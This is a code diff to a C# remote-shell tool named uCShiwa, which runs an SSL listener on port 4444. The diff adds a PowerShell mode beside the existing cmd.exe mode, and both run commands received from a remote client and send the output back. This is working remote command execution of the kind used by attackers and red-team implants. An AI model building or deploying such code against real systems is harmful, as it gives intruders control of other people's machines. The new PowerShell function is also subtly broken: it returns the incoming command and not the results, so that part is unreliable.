@@ -4,9 +4,14 @@ using System.Net.Security;
 using System.Net.Sockets;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
-using System.Diagnostics;
 using System.Text.RegularExpressions;
 using System.IO;
+using System.Diagnostics;
+using System.Management.Automation;
+
+
+// dotnet.exe .\MyApp.dll 4444 .\uCShiwa-testing.pfx ucshiwa #to debug
+// dotnet.exe publish -r win-x64 #to publish .exe
 
 namespace uCShiwa
 {
@@ -42,7 +47,7 @@ namespace uCShiwa
             Console.WriteLine("                  #@@@                  ");
 
             Console.ForegroundColor = ConsoleColor.Red;
-            Console.WriteLine("-o uCShiwa v2.0.4");
+            Console.WriteLine("-o uCShiwa v3.0.1");
             Console.ResetColor();
 
             //SERVER MODE
@@ -77,6 +82,7 @@ namespace uCShiwa
                 Console.WriteLine("\nHELP:");
                 Console.WriteLine("changedir <dir> : to change working directory");
                 Console.WriteLine("cmdtimeout <int(ms)> : to change command execution timeout");
+                Console.WriteLine("pwsh <0|1> : swhitch to powershell mode (beta)");
                 Console.WriteLine("\n");
                 Console.ResetColor();
 
@@ -122,10 +128,11 @@ namespace uCShiwa
                 string message;
                 string currentWorkingDir = ".";
                 int timeout = 3000;
+                int pwsh = 0;
 
                 while (true)
                 {
-                    // Read nest command
+                    // Read next command
                     message = readMsg(sslStream, client);
 
                     //set current directory
@@ -148,9 +155,26 @@ namespace uCShiwa
                         }
                     }
 
-                    //execute command
-                    message = executeCmd(message, currentWorkingDir, timeout);
+                    //set powershellmode
+                    if (Regex.IsMatch(message, @"^pwsh "))
+                    {
+                        message = message.Replace("pwsh ", "");
+                        if (Regex.IsMatch(message, @"^\d+$"))
+                        {
+                            pwsh = int.Parse(message);
+                        }
+                    }
 
+                    //execute command
+                    if (pwsh == 0)
+                    {
+                        message = executeCmd(message, currentWorkingDir, timeout);
+                    }
+                    else
+                    {
+                        message = executePwsh(message);
+                    }
+             
                     // send output
                     sendMsg(message, sslStream);
 
@@ -192,7 +216,8 @@ namespace uCShiwa
         private static string executeCmd(string message, string currentWorkingDir, int timeout)
         {
 
-            //execute command
+            //execute command in v2
+
             Process cmd = new Process();
             cmd.StartInfo.FileName = "cmd.exe";
             cmd.StartInfo.RedirectStandardInput = true;
@@ -211,7 +236,27 @@ namespace uCShiwa
                 message = cmd.StandardOutput.ReadToEnd();
             }
             catch { message = "ERROR"; }
+            return message;
+        }
+        private static string executePwsh(string message)
+        { 
+            using (PowerShell ps = PowerShell.Create())
+            {
+                try{
+                    var results = ps.AddScript(message).Invoke();
+                    Console.WriteLine(results);
 
+                    ps.Commands.Clear();
+                    /*
+                    Console.WriteLine("\nEvaluating '([S.M.A.ActionPreference], [S.M.A.AliasAttribute]).FullName' in PS Core Runspace\n");
+                    results = ps.AddScript("([System.Management.Automation.ActionPreference], [System.Management.Automation.AliasAttribute]).FullName").Invoke();
+                    foreach (dynamic result in results)
+                    {
+                        Console.WriteLine(result.ToString());
+                    }
+                    */
+                }catch{ message = "ERROR"; }
+            }
             return message;
         }
     }
